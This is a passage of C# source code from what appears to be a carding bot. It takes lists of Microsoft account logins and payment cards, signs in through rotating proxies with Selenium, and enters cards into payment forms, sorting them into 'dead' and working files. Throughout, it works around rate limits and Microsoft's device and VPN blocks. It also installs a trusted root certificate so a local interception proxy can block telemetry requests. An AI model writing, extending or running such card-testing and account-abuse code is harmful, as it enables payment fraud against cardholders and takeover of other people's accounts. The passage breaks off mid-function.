        static void AddToFailed(string acc, string card, List<string> failed_acc, List<string> failed_cc, bool is_sys_fail = false)
        {
            AppendToFile("sor/fail_cc.txt", card);
            AppendToFile("sor/fail_acc.txt", acc);
            failed_cc.Add(card);
            failed_acc.Add(acc);
            if (is_sys_fail)
            {
                AppendToFile("sor/failed_cc_sys.txt", card);
                AppendToFile("sor/failed_acc_sys.txt", acc);
            }
            failedCards++;
            totalAccounts++;
            
            // Release the card from global used cards since it's no longer being processed
            // (unless it's already marked as dead)
            lock (cardLock)
            {
                if (!globalDeadCards.Contains(card))
                {
                    globalUsedCards.Remove(card);
                }
            }
            
            // Release user agent for this account
            string accountEmail = acc.Contains(':') ? acc.Split(':')[0] : acc;
            ReleaseUserAgent(accountEmail);
            
            // Removed direct console output to prevent "out of place" messages
        }

        static void AddToSuccess(string acc, string card, List<string> success_acc, List<string> success_cc)
        {
            AppendToFile("sor/sec_cc.txt", card);
            AppendToFile("sor/sec_acc.txt", acc);
            success_cc.Add(card);
            success_acc.Add(acc);
            successfulCards++;
            totalAccounts++;
            
            // Release the card from global used cards since it was successfully added
            lock (cardLock)
            {
                globalUsedCards.Remove(card);
            }
            
            // Release user agent for this account
            string accountEmail = acc.Contains(':') ? acc.Split(':')[0] : acc;
            ReleaseUserAgent(accountEmail);
            
            // Removed direct console output to prevent "out of place" messages
        }

        static void AddToLocked(string acc, string card, List<string> failed_acc, List<string> failed_cc)
        {
            AppendToFile("sor/loc_cc.txt", card);
            AppendToFile("sor/loc_acc.txt", acc);
            failed_cc.Add(card);
            failed_acc.Add(acc);
            lockedAccounts++;
            totalAccounts++;
            
            // Release the card from global used cards since it's no longer being processed
            // (unless it's already marked as dead)
            lock (cardLock)
            {
                if (!globalDeadCards.Contains(card))
                {
                    globalUsedCards.Remove(card);
                }
            }
            
            // Release user agent for this account
            string accountEmail = acc.Contains(':') ? acc.Split(':')[0] : acc;
            ReleaseUserAgent(accountEmail);
            
            // Removed direct console output to prevent "out of place" messages
        }

        // Thread-safe method to get a new unique card (excluding dead cards and used cards)
        static string? GetNewCard(List<string>? excludeCards = null)
        {
            lock (cardLock)
            {
                RemoveEmptyLines("sor/cc.txt");
                string path = Path.Combine(GetBaseDir(), "sor/cc.txt");
                string deadCardsPath = Path.Combine(GetBaseDir(), "sor/dead_cards.txt");
                
                if (!File.Exists(path) || File.ReadLines(path).Count() == 0)
                {
                    Console.WriteLine("[DEBUG] GetNewCard: No cards available in cc.txt");
                    return null; // No more cards available
                }
                
                // Always reload dead cards from file to ensure thread safety
                HashSet<string> fileDeadCards = new HashSet<string>();
                if (File.Exists(deadCardsPath))
                {
                    var deadCardsFromFile = File.ReadAllLines(deadCardsPath)
                        .Where(line => !string.IsNullOrWhiteSpace(line))
                        .Select(line => line.Trim());
                    foreach (var deadCard in deadCardsFromFile)
                    {
                        fileDeadCards.Add(deadCard);
                        globalDeadCards.Add(deadCard); // Sync with global tracking
                    }
                }
                
                // Combine all exclusions: file dead cards + global dead cards + globally used cards + thread-specific exclusions
                HashSet<string> allExcludedCards = new HashSet<string>(fileDeadCards);
                foreach (var deadCard in globalDeadCards)
                {
                    allExcludedCards.Add(deadCard);
                }
                foreach (var usedCard in globalUsedCards)
                {
                    allExcludedCards.Add(usedCard);
                }
                
                if (excludeCards != null)
                {
                    foreach (string excludeCard in excludeCards)
                    {
                        if (!string.IsNullOrWhiteSpace(excludeCard))
                        {
                            allExcludedCards.Add(excludeCard.Trim());
                        }
                    }
                }
                
                // Enhanced debug output for thread safety verification
                int currentThreadId = System.Threading.Thread.CurrentThread.ManagedThreadId;
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - File dead cards: {fileDeadCards.Count}");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Global dead cards: {globalDeadCards.Count}");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Global used cards: {globalUsedCards.Count}");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Thread excluded cards: {excludeCards?.Count ?? 0}");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Total excluded cards: {allExcludedCards.Count}");
                
                // Find first card that's not in any exclusion list
                var availableCards = File.ReadLines(path)
                    .Where(card => !string.IsNullOrWhiteSpace(card) && !allExcludedCards.Contains(card.Trim()))
                    .ToList();
                
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Available cards after all exclusions: {availableCards.Count}");
                
                if (availableCards.Count == 0)
                {
                    Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - No cards available after exclusions");
                    Console.WriteLine($"[DEBUG] GetNewCard: Excluded cards: [{string.Join(", ", allExcludedCards.Take(10).Select(c => c.Substring(0, Math.Min(8, c.Length)) + "****"))}...]");
                    return null; // No cards available
                }
                
                string newCard = availableCards.First();
                
                // Add to global used cards immediately and remove from cc.txt
                globalUsedCards.Add(newCard);
                DeleteLineFromFile(path, newCard);
                
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Selected card: {newCard.Substring(0, Math.Min(8, newCard.Length))}****");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Card added to global used cards and removed from cc.txt");
                Console.WriteLine($"[DEBUG] GetNewCard: Thread {currentThreadId} - Global used cards now: {globalUsedCards.Count}");
                return newCard;
            }
        }

        // Method to check for login stall
        static bool IsLoginStalled(IWebDriver driver)
        {
            try
            {
                // Check for "Trying to sign you in" message - primary indicator
                var tryingToSignInElement = driver.FindElements(By.XPath("//div[@id='loginHeader' and contains(text(), 'Trying to sign you in')]"));
                if (tryingToSignInElement.Count > 0 && tryingToSignInElement[0].Displayed)
                {
                    return true;
                }
                
                // Check for the specific HTML structure from the provided page
                var tryingToSignInElement2 = driver.FindElements(By.XPath("//div[@class='row title ext-title' and contains(text(), 'Trying to sign you in')]"));
                if (tryingToSignInElement2.Count > 0 && tryingToSignInElement2[0].Displayed)
                {
                    return true;
                }
                
                // Check for progress container that appears with "Trying to sign you in"
                var progressContainer = driver.FindElements(By.XPath("//div[@class='row progress-container']"));
                var loginHeader = driver.FindElements(By.XPath("//*[contains(text(), 'Trying to sign you in')]"));
                if (progressContainer.Count > 0 && loginHeader.Count > 0)
                {
                    return true;
                }
                
                // Also check for other stall indicators
                var stalledElements = driver.FindElements(By.XPath("//*[contains(text(), 'Trying to sign you in') or contains(text(), 'Please wait') or contains(text(), 'Loading')]"));
                return stalledElements.Count > 0 && stalledElements[0].Displayed;
            }
            catch
            {
                return false;
            }
        }

        // Method to handle page timeouts and proxy issues
        static bool IsPageTimeoutOrProxyIssue(Exception ex)
        {
            string errorMessage = ex.Message.ToLower();
            return errorMessage.Contains("timeout") || 
                   errorMessage.Contains("page takes too long") ||
                   errorMessage.Contains("took too long") ||
                   errorMessage.Contains("navigation timeout") ||
                   errorMessage.Contains("page load timeout") ||
                   errorMessage.Contains("connection refused") ||
                   errorMessage.Contains("proxy") ||
                   errorMessage.Contains("network") ||
                   errorMessage.Contains("err_empty_response") ||
                   errorMessage.Contains("this page isn't working") ||
                   errorMessage.Contains("didn't send any data") ||
                   errorMessage.Contains("empty response");
        }

        // Method to check for "Too Many Requests" response
        static bool IsTooManyRequestsError(IWebDriver driver)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for both general "Too Many Requests" text and specific HTML format
                if (driver.PageSource.Contains("Too Many Requests") || 
                    driver.PageSource.Contains("<html><head></head><body>Too Many Requests</body></html>"))
                {
                    return true;
                }
                
                // Check for ERR_EMPTY_RESPONSE and "This page isn't working" errors
                if (driver.PageSource.Contains("ERR_EMPTY_RESPONSE") ||
                    driver.PageSource.Contains("This page isn't working") ||
                    driver.PageSource.Contains("didn't send any data"))
                {
                    return true;
                }
                
                // Check for specific footer elements with privacy/terms links that appear during rate limiting
                // This is different from the regular privacy notice with OK buttons
                bool hasPrivacyFooter = driver.PageSource.Contains("id=\"ftrPrivacy\"") && 
                                       driver.PageSource.Contains("Privacy & cookies");
                bool hasTermsFooter = driver.PageSource.Contains("id=\"ftrTerms\"") && 
                                     driver.PageSource.Contains("Terms of use");
                bool hasTryingToSignIn = driver.PageSource.Contains("id=\"loginHeader\"") && 
                                        driver.PageSource.Contains("Trying to sign you in");
                
                // If we have these specific footer elements along with "Trying to sign you in", 
                // it often indicates rate limiting or proxy issues
                if (hasPrivacyFooter && hasTermsFooter && hasTryingToSignIn)
                {
                    return true;
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        // Method to check for ERR_EMPTY_RESPONSE and "This page isn't working" errors specifically
        static bool IsEmptyResponseError(IWebDriver driver)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for ERR_EMPTY_RESPONSE error
                if (driver.PageSource.Contains("ERR_EMPTY_RESPONSE"))
                {
                    return true;
                }
                
                // Check for "This page isn't working" error
                if (driver.PageSource.Contains("This page isn't working"))
                {
                    return true;
                }
                
                // Check for "didn't send any data" error
                if (driver.PageSource.Contains("didn't send any data"))
                {
                    return true;
                }
                
                // Check for login.live.com specific error
                if (driver.PageSource.Contains("login.live.com didn't send any data"))
                {
                    return true;
                }
                
                // Check URL title for these errors as well
                try
                {
                    string title = driver.Title?.ToLower() ?? "";
                    if (title.Contains("this page isn't working") || 
                        title.Contains("err_empty_response"))
                    {
                        return true;
                    }
                }
                catch
                {
                    // Ignore title check errors
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        // Method to handle ERR_EMPTY_RESPONSE and "This page isn't working" errors
        static bool HandleEmptyResponseError(IWebDriver driver, string proxy, int threadNumber, string acc, string card)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for ERR_EMPTY_RESPONSE and "This page isn't working" errors
                if (IsEmptyResponseError(driver))
                {
                    if (is_use_proxy && !string.IsNullOrWhiteSpace(proxy))
                    {
                        PrintError(threadNumber, "ERR_EMPTY_RESPONSE or 'This page isn't working' detected - killing proxy and requeuing account");
                        AddThreadAction(threadNumber, "ERR_EMPTY_RESPONSE - killing proxy & requeuing");
                        
                        // Immediately ban the proxy and requeue the account
                        BanCurrentProxy(proxy);
                        RequeueAccount(acc, card);
                        
                        PrintError(threadNumber, $"Proxy {proxy.Split(':')[0]}:{proxy.Split(':')[1]} banned due to ERR_EMPTY_RESPONSE");
                        PrintInfo(threadNumber, $"Account {acc.Split(':')[0]} requeued for retry with different proxy");
                    }
                    else
                    {
                        PrintError(threadNumber, "ERR_EMPTY_RESPONSE or 'This page isn't working' detected - requeuing account");
                        AddThreadAction(threadNumber, "ERR_EMPTY_RESPONSE - requeuing");
                        RequeueAccount(acc, card);
                    }
                    
                    return true; // Return true to indicate account should be requeued
                }
                
                return false; // No ERR_EMPTY_RESPONSE error detected
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error in HandleEmptyResponseError: {ex.Message}");
                return false;
            }
        }

        // Method to handle "Trying to sign you in" stall with refresh and requeue logic
        static bool HandleTryingToSignInStall(IWebDriver driver, string proxy, int threadNumber, string acc, string card)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for "Trying to sign you in" stall condition
                if (IsLoginStalled(driver))
                {
                    PrintError(threadNumber, "Login stalled at 'Trying to sign you in' - attempting 5 refreshes");
                    AddThreadAction(threadNumber, "Login stall detected - refreshing");
                    
                    // Try refreshing up to 5 times
                    for (int attempt = 1; attempt <= 5; attempt++)
                    {
                        try
                        {
                            PrintInfo(threadNumber, $"Refresh attempt {attempt}/5 for login stall");
                            AddThreadAction(threadNumber, $"Login stall refresh {attempt}/5");
                            
                            driver.Navigate().Refresh();
                            Thread.Sleep(3000); // Wait 3 seconds between refreshes
                            
                            // Check if the stall is resolved
                            if (!IsLoginStalled(driver))
                            {
                                PrintSuccess(threadNumber, $"Login stall resolved after {attempt} refresh(es)");
                                AddThreadAction(threadNumber, $"Login stall resolved after {attempt} refreshes");
                                return false; // Stall resolved, continue processing
                            }
                        }
                        catch (Exception ex)
                        {
                            PrintError(threadNumber, $"Error during login stall refresh attempt {attempt}: {ex.Message}");
                        }
                    }
                    
                    // If we reach here, all 5 refresh attempts failed
                    if (is_use_proxy && !string.IsNullOrWhiteSpace(proxy))
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed for login stall - requeuing account and banning proxy");
                        AddThreadAction(threadNumber, "5 login stall refreshes failed - requeuing & banning proxy");
                        BanCurrentProxy(proxy);
                    }
                    else
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed for login stall - requeuing account");
                        AddThreadAction(threadNumber, "5 login stall refreshes failed - requeuing");
                    }
                    RequeueAccount(acc, card);
                    return true; // Return true to indicate account should be requeued
                }
                
                return false; // No login stall detected
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error in HandleTryingToSignInStall: {ex.Message}");
                return false;
            }
        }
        static bool HandleMicrosoftAuthError(IWebDriver driver, string proxy, int threadNumber, string acc, string card)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for Microsoft authentication error message
                if (driver.PageSource.Contains("Please retry with a different device, use a VPN, or other authentication method to sign in") ||
                    driver.PageSource.Contains("https://go.microsoft.com/fwlink/?linkid=2317517"))
                {
                    PrintError(threadNumber, "Microsoft authentication error detected - attempting refreshes");
                    AddThreadAction(threadNumber, "MS auth error - refreshing");
                    
                    // Try refreshing up to 5 times
                    for (int attempt = 1; attempt <= 5; attempt++)
                    {
                        try
                        {
                            PrintInfo(threadNumber, $"Refresh attempt {attempt}/5");
                            AddThreadAction(threadNumber, $"Refresh {attempt}/5");
                            
                            driver.Navigate().Refresh();
                            Thread.Sleep(3000); // Wait 3 seconds between refreshes
                            
                            // Check if the error is gone
                            if (!driver.PageSource.Contains("Please retry with a different device, use a VPN, or other authentication method to sign in") &&
                                !driver.PageSource.Contains("https://go.microsoft.com/fwlink/?linkid=2317517"))
                            {
                                PrintSuccess(threadNumber, $"Authentication error resolved after {attempt} refresh(es)");
                                AddThreadAction(threadNumber, $"Auth error resolved after {attempt} refreshes");
                                return false; // Error resolved, continue processing
                            }
                        }
                        catch (Exception ex)
                        {
                            PrintError(threadNumber, $"Error during refresh attempt {attempt}: {ex.Message}");
                        }
                    }
                    
                    // If we reach here, all 5 refresh attempts failed
                    if (is_use_proxy && !string.IsNullOrWhiteSpace(proxy))
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed - banning proxy and requeuing account");
                        AddThreadAction(threadNumber, "5 refreshes failed - banning proxy & requeuing");
                        BanCurrentProxy(proxy);
                        PrintInfo(threadNumber, $"Account {acc.Split(':')[0]} requeued for retry with different proxy (VPN error)");
                    }
                    else
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed - requeuing account");
                        AddThreadAction(threadNumber, "5 refreshes failed - requeuing");
                    }
                    RequeueAccount(acc, card);
                    return true; // Return true to indicate account should be requeued
                }
                
                return false; // No authentication error detected
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error in HandleMicrosoftAuthError: {ex.Message}");
                return false;
            }
        }

        // Method to handle "Too Many Requests" error with retry logic
        static bool HandleTooManyRequestsError(IWebDriver driver, string proxy, int threadNumber, string acc, string card)
        {
            try
            {
                if (driver?.PageSource == null) return false;
                
                // Check for "Too Many Requests" errors
                if (driver.PageSource.Contains("Too Many Requests") || 
                    driver.PageSource.Contains("<html><head></head><body>Too Many Requests</body></html>"))
                {
                    PrintError(threadNumber, "Too Many Requests error detected - attempting refreshes");
                    AddThreadAction(threadNumber, "Too Many Requests - refreshing");
                    
                    // Try refreshing up to 15 times
                    for (int attempt = 1; attempt <= 15; attempt++)
                    {
                        try
                        {
                            PrintInfo(threadNumber, $"Refresh attempt {attempt}/15 for Too Many Requests");
                            AddThreadAction(threadNumber, $"TMR refresh {attempt}/15");
                            
                            driver.Navigate().Refresh();
                            Thread.Sleep(3000); // Wait 3 seconds between refreshes
                            
                            // Check if the error is gone
                            if (!driver.PageSource.Contains("Too Many Requests") &&
                                !driver.PageSource.Contains("<html><head></head><body>Too Many Requests</body></html>"))
                            {
                                PrintSuccess(threadNumber, $"Too Many Requests error resolved after {attempt} refresh(es)");
                                AddThreadAction(threadNumber, $"TMR error resolved after {attempt} refreshes");
                                return false; // Error resolved, continue processing
                            }
                        }
                        catch (Exception ex)
                        {
                            PrintError(threadNumber, $"Error during TMR refresh attempt {attempt}: {ex.Message}");
                        }
                    }
                    
                    // If we reach here, all 5 refresh attempts failed
                    if (is_use_proxy && !string.IsNullOrWhiteSpace(proxy))
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed for Too Many Requests - banning proxy and requeuing account");
                        AddThreadAction(threadNumber, "5 TMR refreshes failed - banning proxy & requeuing");
                        BanCurrentProxy(proxy);
                        PrintInfo(threadNumber, $"Account {acc.Split(':')[0]} requeued for retry with different proxy (Too Many Requests)");
                    }
                    else
                    {
                        PrintError(threadNumber, "All 5 refresh attempts failed for Too Many Requests - requeuing account");
                        AddThreadAction(threadNumber, "5 TMR refreshes failed - requeuing");
                    }
                    RequeueAccount(acc, card);
                    return true; // Return true to indicate account should be requeued
                }
                
                return false; // No Too Many Requests error detected
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error in HandleTooManyRequestsError: {ex.Message}");
                return false;
            }
        }

        // Method to detect card validation errors
        static bool IsCardError(IWebDriver driver, int threadNumber)
        {
            try
            {
                PrintInfo(threadNumber, "Checking for card errors...");
                
                // Check for any card error (general card error OR CVC/security code error)
                var cardErrors = driver.FindElements(By.XPath("//span[@data-automation-id='error-message' and (contains(text(),'Check that the details in all fields are correct or try a different card.') or contains(text(),'Check your security code. There appears to be an error in it.'))]"));
                if (cardErrors.Count > 0 && cardErrors[0].Displayed)
                {
                    PrintError(threadNumber, $"Card error detected with original XPath: {cardErrors[0].Text}");
                    return true;
                }

                // Additional comprehensive error detection - search for any error messages
                var allErrorElements = new List<IWebElement>();
                
                // Try different common error selectors
                var errorSelectors = new[]
                {
                    "//span[contains(@class, 'error')]",
                    "//div[contains(@class, 'error')]", 
                    "//*[contains(text(), 'security code')]",
                    "//*[contains(text(), 'cvv')]",
                    "//*[contains(text(), 'cvc')]",
                    "//*[contains(text(), 'Check your')]",
                    "//*[contains(text(), 'error')]",
                    "//*[contains(text(), 'incorrect')]",
                    "//*[contains(text(), 'invalid')]",
                    "//*[@data-automation-id='error-message']",
                    "//span[@role='alert']",
                    "//div[@role='alert']"
                };

                foreach (var selector in errorSelectors)
                {
                    try
                    {
                        var elements = driver.FindElements(By.XPath(selector));
                        foreach (var element in elements)
                        {
                            if (element.Displayed && !string.IsNullOrWhiteSpace(element.Text))
                            {
                                string errorText = element.Text.Trim();
                                PrintWarning(threadNumber, $"Found potential error with selector '{selector}': {errorText}");
                                
                                // Check if this looks like a card-related error
                                if (errorText.ToLower().Contains("security") || 
                                    errorText.ToLower().Contains("cvv") || 
                                    errorText.ToLower().Contains("cvc") ||
                                    errorText.ToLower().Contains("card") ||
                                    errorText.ToLower().Contains("check") ||
                                    errorText.ToLower().Contains("correct") ||
                                    errorText.ToLower().Contains("details"))
                                {
                                    PrintError(threadNumber, $"CARD ERROR DETECTED with alternative method: {errorText}");
                                    return true;
                                }
                            }
                        }
                    }
                    catch { }
                }

                PrintInfo(threadNumber, "No card errors detected with any method");
                return false;
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error checking for card errors: {ex.Message}");
                return false;
            }
        }

        // Method to add card to dead cards file - Enhanced with global tracking
        static void AddToDeadCards(string card, int threadNumber)
        {
            try
            {
                lock (cardLock)
                {
                    // Add to global dead cards immediately - this is critical for thread safety
                    globalDeadCards.Add(card);
                    
                    // Remove from global used cards if it was there
                    globalUsedCards.Remove(card);
                    
                    Console.WriteLine($"[DEBUG] AddToDeadCards: Thread {threadNumber} - Card {card.Substring(0, Math.Min(8, card.Length))}**** added to global dead cards");
                    Console.WriteLine($"[DEBUG] AddToDeadCards: Thread {threadNumber} - Global dead cards count: {globalDeadCards.Count}");
                    Console.WriteLine($"[DEBUG] AddToDeadCards: Thread {threadNumber} - Global used cards count: {globalUsedCards.Count}");
                }
                
                // Append to file
                AppendToFile("sor/dead_cards.txt", card);
                PrintWarning(threadNumber, $"Card {card.Substring(0, Math.Min(8, card.Length))}**** added to dead cards");
                Console.WriteLine($"[DEBUG] Thread {threadNumber} - Card {card.Substring(0, Math.Min(8, card.Length))}**** marked as dead globally and written to file");
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error adding card to dead cards: {ex.Message}");
            }
        }

        // Method to release card from global used cards when thread is done
        static void ReleaseCardFromGlobalUsed(string card, int threadNumber)
        {
            try
            {
                lock (cardLock)
                {
                    if (globalUsedCards.Remove(card))
                    {
                        Console.WriteLine($"[DEBUG] Thread {threadNumber} - Card {card.Substring(0, Math.Min(8, card.Length))}**** released from global used cards");
                    }
                }
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error releasing card from global used: {ex.Message}");
            }
        }

        // Method to check if card was successfully added
        static bool IsCardSuccess(IWebDriver driver, int threadNumber)
        {
            try
            {
                var closeButton = driver.FindElements(By.XPath("//*[text()='Close']"));
                return closeButton.Count > 0 && closeButton[0].Displayed;
            }
            catch
            {
                return false;
            }
        }

        // Method to clear card input fields
        static void ClearCardFields(IWebDriver driver, int threadNumber)
        {
            try
            {
                PrintInfo(threadNumber, "Starting to clear card fields...");
                
                // First check if we're still on a card form page - avoid clearing if card was successfully added
                try
                {
                    var cardFormCheck = driver.FindElements(By.Id("accountHolderName"));
                    if (cardFormCheck.Count == 0)
                    {
                        PrintInfo(threadNumber, "Card form not present - skipping field clearing (likely card was successfully added)");
                        return;
                    }
                }
                catch 
                {
                    PrintInfo(threadNumber, "Cannot access card form - skipping field clearing");
                    return;
                }
                
                // Use JavaScript to clear all form fields more reliably
                IJavaScriptExecutor js = (IJavaScriptExecutor)driver;
                
                // Clear account holder name (new random name will be generated in FillCardDetails)
                try
                {
                    var nameField = FindElementWithWait(driver, By.Id("accountHolderName"), 5); // 5 second timeout instead of 600
                    if (nameField != null)
                    {
                        js.ExecuteScript("arguments[0].value = '';", nameField);
                        nameField.Clear();
                        // Send additional clear signals
                        nameField.SendKeys(Keys.Control + "a");
                        nameField.SendKeys(Keys.Delete);
                        PrintInfo(threadNumber, "Name field cleared completely");
                    }
                }
                catch { }

                // Clear card number field - try multiple approaches
                try
                {
                    // Try by direct ID first
                    var cardNumberField = driver.FindElements(By.Id("cardNumber"));
                    if (cardNumberField.Count > 0)
                    {
                        js.ExecuteScript("arguments[0].value = '';", cardNumberField[0]);
                        cardNumberField[0].Clear();
                        PrintInfo(threadNumber, "Card number field cleared (by ID)");
                    }
                    else
                    {
                        // Try by focusing and clearing
                        var nameField = FindElementWithWait(driver, By.Id("accountHolderName"), 3); // 3 second timeout
                        if (nameField != null)
                        {
                            nameField.SendKeys(Keys.Tab);
                            var activeElement = driver.SwitchTo().ActiveElement();
                            if (activeElement != null)
                            {
                                js.ExecuteScript("arguments[0].value = '';", activeElement);
                                activeElement.Clear();
                                PrintInfo(threadNumber, "Card number field cleared (by tab)");
                            }
                        }
                    }
                }
                catch { }

                // Reset month dropdown to default
                try
                {
                    var monthField = FindElementWithWait(driver, By.Id("input_expiryMonth-option"), 3); // 3 second timeout
                    if (monthField != null)
                    {
                        js.ExecuteScript("arguments[0].innerHTML = 'Month';", monthField);
                        js.ExecuteScript("arguments[0].setAttribute('aria-expanded', 'false');", monthField);
                        PrintInfo(threadNumber, "Month dropdown reset");
                    }
                }
                catch { }

                // Reset year dropdown to default
                try
                {
                    var yearField = FindElementWithWait(driver, By.Id("input_expiryYear-option"), 3); // 3 second timeout
                    if (yearField != null)
                    {
                        js.ExecuteScript("arguments[0].innerHTML = 'Year';", yearField);
                        js.ExecuteScript("arguments[0].setAttribute('aria-expanded', 'false');", yearField);
                        PrintInfo(threadNumber, "Year dropdown reset");
                    }
                }
                catch { }

                // Clear CVV field
                try
                {
                    var cvvField = driver.FindElements(By.Id("cvv"));
                    if (cvvField.Count > 0)
                    {
                        js.ExecuteScript("arguments[0].value = '';", cvvField[0]);
                        cvvField[0].Clear();
                        PrintInfo(threadNumber, "CVV field cleared (by ID)");
                    }
                    else
                    {
                        // Try tabbing to CVV field
                        Actions actions = new Actions(driver);
                        actions.SendKeys(Keys.Tab).SendKeys(Keys.Tab).SendKeys(Keys.Tab).Perform();
                        Thread.Sleep(250); // Reduced from 500ms to 250ms
                        var activeElement = driver.SwitchTo().ActiveElement();
                        if (activeElement != null)
                        {
                            js.ExecuteScript("arguments[0].value = '';", activeElement);
                            activeElement.Clear();
                            PrintInfo(threadNumber, "CVV field cleared (by tab)");
                        }
                    }
                }
                catch { }

                // Wait for clearing to complete
                Thread.Sleep(750); // Reduced from 1500ms to 750ms
                PrintInfo(threadNumber, "Card fields clearing completed with optimized speed");
            }
            catch (Exception ex)
            {
                PrintError(threadNumber, $"Error clearing card fields: {ex.Message}");
            }
        }

        static Task OnRequest(object sender, SessionEventArgs e)
        {
            try
            {
                var request = e.HttpClient.Request;

                string contentType = request.Headers.FirstOrDefault(h => h.Name.Equals("Content-Type", StringComparison.OrdinalIgnoreCase))?.Value?.ToLower() ?? "";
                string accept = request.Headers.FirstOrDefault(h => h.Name.Equals("Accept", StringComparison.OrdinalIgnoreCase))?.Value?.ToLower() ?? "";
                string requestUrl = request.Url?.ToLower() ?? "";


                if (
                    contentType.Contains("image") ||
                    contentType.Contains("css") ||
                    contentType.Contains("video") ||
                    requestUrl.Contains("https://optimizationguide-pa.googleapis.com/downloads") ||
                    requestUrl.Contains("googleapis.com") ||
                    requestUrl.Contains("images") ||
                    requestUrl.Contains("/videos/") ||
                    accept.Contains("css") ||

                    requestUrl.Contains(".svg") ||
                    requestUrl.Contains("css") ||
                    requestUrl.Contains("https://assets.account.microsoft.com/services/m365upsell.svg") ||

                    requestUrl.Contains(".woff") ||
                    requestUrl.Contains("logclient") ||
                    requestUrl.Contains(".ico") ||
                    requestUrl.Contains("onecollector") ||
                    requestUrl.Contains("df6.cfp.microsoft.com/probe") ||
                    requestUrl.Contains("collect")
                )
                {
                    e.Ok("");
                    return Task.CompletedTask;
                }
            }
            catch
            {
                // Removed direct console output to prevent "out of place" messages
            }

            return Task.CompletedTask;
        }
        static Task OnResponse(object sender, SessionEventArgs e)
        {
            // Optional: Log or modify responses here
            return Task.CompletedTask;
        }
        static void Run(string s, int thread_n)
        {
            AddThreadAction(thread_n, is_use_proxy ? "Thread started - Initializing proxy" : "Thread started - Proxyless mode");
            
            // Get proxy using round-robin
            string proxyy = string.Empty;
            ProxyServer? proxyServer = null;
            int localPort = 0;
            if (is_use_proxy)
            {
                try
                {
                    proxyy = GetNextProxy();
                    AddThreadAction(thread_n, $"Assigned proxy: {proxyy.Split(':')[0]}:{proxyy.Split(':')[1]}");
                }
                catch (Exception ex)
                {
                    PrintError(thread_n, $"No proxies available: {ex.Message}");
                    is_exit = true;
                    return;
                }

                string[] proxy = proxyy.Split(":");
                PrintInfo(thread_n, $"Using proxy: {proxy[0]}:{proxy[1]}");
                string proxy_server = proxy[0];
                string proxy_port = proxy[1];
                string proxy_username = proxy[2];
                string proxy_password = proxy[3];
                
                // Set external (chained) proxy
                var upstreamProxy = new ExternalProxy
                {
                    HostName = proxy_server,
                    Port = int.Parse(proxy_port),
                    UserName = proxy_username,
                    Password = proxy_password,
                    BypassLocalhost = true
                };

                proxyServer = new ProxyServer
                {
                    ForwardToUpstreamGateway = true
                };

                if (proxyServer.CertificateManager.CreateRootCertificate())
                {
                    proxyServer.CertificateManager.TrustRootCertificate();
                }

                proxyServer.BeforeRequest += OnRequest;
                proxyServer.BeforeResponse += OnResponse;

                bool useProxy = true;
                proxyServer.GetCustomUpStreamProxyFunc = (session) =>
                {
                    return Task.FromResult<IExternalProxy?>(useProxy ? upstreamProxy : null);
                };

                var endpoint = new ExplicitProxyEndPoint(IPAddress.Loopback, 0, true);
                proxyServer.AddEndPoint(endpoint);
                proxyServer.Start();

                while (!proxyServer.ProxyRunning)
                {
                    Thread.Sleep(100);
                }

                localPort = endpoint.Port;
                AddThreadAction(thread_n, $"Local proxy: {localPort}");
            }
            else
            {
                AddThreadAction(thread_n, "Proxyless mode active");
            }
            // Removed direct console output to prevent "out of place" messages

            string acc = string.Empty;
            string? card = null;
            IWebDriver? driver = null; // Declare driver at function scope for cleanup access

            List<string> success_acc = new List<string>();
            List<string> failed_acc = new List<string>();
            List<string> success_cc = new List<string>();
            List<string> failed_cc = new List<string>();
            RemoveEmptyLines("sor/cc.txt");
            RemoveEmptyLines("sor/acc.txt");

            try
            {
                string accPath = Path.Combine(GetBaseDir(), "sor/acc.txt");
                string ccPath = Path.Combine(GetBaseDir(), "sor/cc.txt");

                // Read account with improved error handling
                lock (fileLock)
                {
                    try
                    {
                        if (!File.Exists(accPath))
                        {
                            PrintError(thread_n, "Account file does not exist - exiting");
                            is_exit = true;
                            return;
                        }
                        
                        var accountLines = File.ReadAllLines(accPath).Where(l => !string.IsNullOrWhiteSpace(l)).ToArray();
                        if (accountLines.Length == 0)
                        {
                            PrintError(thread_n, "No accounts available - exiting");
                            is_exit = true;
                            return;
                        }
                        
                        acc = accountLines[0];
                        DeleteLineFromFile(accPath, acc);
                    }
                    catch (Exception ex)
                    {
                        PrintError(thread_n, $"Error reading account file: {ex.Message}");
                        is_exit = true;
                        return;
                    }
                }

                // Read card with improved error handling (excluding dead cards)
                card = GetNewCard();
                if (card == null)
                {
                    PrintError(thread_n, "No valid cards available - all may be dead or file empty");
                    
                    // Return account to file
                    try
                    {
                        File.AppendAllText(accPath, acc + Environment.NewLine);
                    }
                    catch { }
                    
                    bool cardsInUse = false;
                    lock (cardLock)
                    {
